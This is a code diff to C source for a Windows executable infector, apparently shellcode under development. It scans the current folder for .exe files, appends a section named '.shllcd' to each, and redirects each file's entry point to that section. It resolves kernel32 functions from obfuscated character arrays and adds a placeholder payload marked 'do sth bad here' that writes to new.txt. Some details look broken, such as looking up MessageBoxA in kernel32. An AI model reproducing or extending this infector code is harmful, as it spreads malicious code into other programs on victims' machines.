@@ -36,6 +36,7 @@
 #define GETPROCESSHEAP_NAME_LEN 15
 #define SETFILEPOINTER_NAME_LEN 15
 #define SETENDOFFILE_NAME_LEN 13
+#define MESSAGEBOXA_NAME_LEN 12
 
 #define SECTION_NAME_LEN 8
 
@@ -242,6 +243,7 @@ address_of_entry_point:
     char getprocessheap_name[GETPROCESSHEAP_NAME_LEN] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p',0};
     char setfilepointer_name[SETFILEPOINTER_NAME_LEN] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r',0};
     char setendoffile_name[SETENDOFFILE_NAME_LEN] = {'S', 'e', 't', 'E', 'n', 'd', 'O', 'f', 'F', 'i', 'l', 'e', 0};
+    char messageboxa_name[MESSAGEBOXA_NAME_LEN] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'b', 'o', 'x', 'A', 0};
     
     char local_all[8] = {'.', '\\', '*', '.', 'e', 'x', 'e', 0};
     char section_name[SECTION_NAME_LEN] = {'.', 's','h', 'l', 'l', 'c', 'd', 0};
@@ -263,6 +265,7 @@ address_of_entry_point:
     fp_HeapAlloc fn_HeapAlloc = get_api(kernel32_dll_base, heapalloc_name, HEAPALLOC_NAME_LEN - 1);
     fp_SetFilePointer fn_SetFilePointer = get_api(kernel32_dll_base, setfilepointer_name, SETFILEPOINTER_NAME_LEN - 1);
     fp_SetEndOfFile fn_SetEndOfFile = get_api(kernel32_dll_base, setendoffile_name, SETENDOFFILE_NAME_LEN);
+    fp_MessageBoxA fn_MessageBoxA = get_api(kernel32_dll_base, messageboxa_name, MESSAGEBOXA_NAME_LEN - 1);
     PVOID self_base = get_dll(NULL, 0);
 
     // get entry off
@@ -279,7 +282,7 @@ address_of_entry_point:
     LARGE_INTEGER size;
     find_fh = fn_FindFirstFileA(local_all, &find_data);
     if(find_fh == INVALID_HANDLE_VALUE){
-        goto label_finish_shellcode;
+        goto label_finish_infect;
     }
     do{
         HANDLE fh = fn_CreateFileA(
@@ -383,7 +386,7 @@ address_of_entry_point:
         // copy
         copy(new_section_header.Name, section_name, 1, SECTION_NAME_LEN);
 
-        int address_of_entry_point_new = new_section_header.VirtualAddress + off;
+        int address_of_entry_point_new = new_section_header.VirtualAddress;
         short number_of_sections_new = number_of_section_old + 1;
         int size_of_image_new = size_of_image_old + virtual_off;
 
@@ -465,12 +468,26 @@ address_of_entry_point:
         fn_SetEndOfFile(fh);
     }while(fn_FindNextFileA(find_fh, &find_data));
 
-    // but let's test first
-    // char test_name[11] = {'.','\\','t', 'e', 's', 't', '.', 'e', 'x', 'e', 0};
+label_finish_infect:
     // do sth bad here
     
+    char try_to_write[10] = {'.', '\\', 'n', 'e', 'w', '.', 't', 'x', 't', 0};
+    HANDLE try_to_write_fh = fn_CreateFileA(
+        try_to_write,
+        GENERIC_WRITE,
+        FILE_SHARE_READ|FILE_SHARE_WRITE,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    if(try_to_write_fh != INVALID_HANDLE_VALUE){
+        char info[5] = {'y', 'e', 'a', 'h', 0};
+        fn_SetFilePointer(try_to_write_fh, 0, NULL, FILE_END);
+        fn_WriteFile(try_to_write_fh, info, 4, NULL, NULL);
+    }
 
-label_finish_shellcode:
+    // finish
     return 0;
 }
 
